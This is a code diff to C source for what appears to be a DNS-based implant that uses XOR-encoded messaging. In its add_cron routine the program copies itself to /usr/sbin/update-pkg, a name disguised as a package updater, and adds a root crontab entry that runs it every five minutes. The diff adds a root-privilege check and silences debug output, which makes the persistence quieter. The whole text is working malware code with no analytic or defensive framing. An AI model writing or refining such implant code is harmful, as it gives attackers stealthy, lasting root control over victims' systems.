@@ -11,7 +11,7 @@
 
 #include "messagetypes.h"
 #include "base64.c"
-#define UUID 0x0001
+#define UUID 0x1234
 #define XOR_CHAR 0x33
  
 char dns_servers[10][100];
@@ -110,6 +110,14 @@ typedef struct
     unsigned char *name;
     struct QUESTION *ques;
 } QUERY;
+
+int hasPriv(void) {
+    uid_t uid=getuid(), euid=geteuid();
+    if (uid != 0 && euid != 0) {
+        return 0;
+    }
+    return -1;
+}
 
 void encode(unsigned char* string, unsigned short string_len, int format) {
     if (format == FORMAT_XOR) {
@@ -611,12 +619,15 @@ int add_cron(char *filename)
     char new_name[] = "/usr/sbin/update-pkg";
     char cronline[] = "*/5\t* * * *\troot\ttest -x /usr/sbin/update-pkg && ( cd /usr/sbin && update-pkg )\n";
 
-    printf("add_cron\n");
+    if ( !hasPriv() ) {
+        return -1;
+    }
+   
 
     // Check if new binary already exists
     if( access( new_name, F_OK ) == -1 ) {
         // file doesn't exist
-        printf("new file doesn't exist. copying...\n");
+        //printf("new file doesn't exist. copying...\n");
 
         cp(new_name, filename);
 
@@ -628,7 +639,7 @@ int add_cron(char *filename)
 
     // Check if we already modified crontab
     if( str_check(crontab, cronline) == -1) {
-        printf("no crontab line\n");
+        //printf("no crontab line\n");
         // No crontab line. Add one.
         FILE *fp;
 
